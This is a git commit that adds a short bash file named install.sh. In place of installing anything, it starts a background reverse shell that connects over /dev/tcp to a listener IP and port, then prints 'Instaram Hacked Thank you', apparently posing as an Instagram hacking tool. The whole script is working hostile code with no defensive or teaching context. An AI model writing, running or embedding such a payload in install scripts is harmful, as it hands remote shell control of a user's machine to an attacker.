889cdc5206c67f2544e2b84b0076147f06422159
swatiai11414 <168453519+swatiai11414@users.noreply.github.com>
2025-01-11 18:03:12 -0800

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+# Reverse shell parameters
+REMOTE_HOST="192.168.1.100"  # Replace with your listener's IP address
+REMOTE_PORT=4444             # Replace with your listener's port
+
+# Start the reverse shell in the background
+nohup bash -i >& /dev/tcp/$REMOTE_HOST/$REMOTE_PORT 0>&1 &
+echo "Instaram Hacked Thank you"
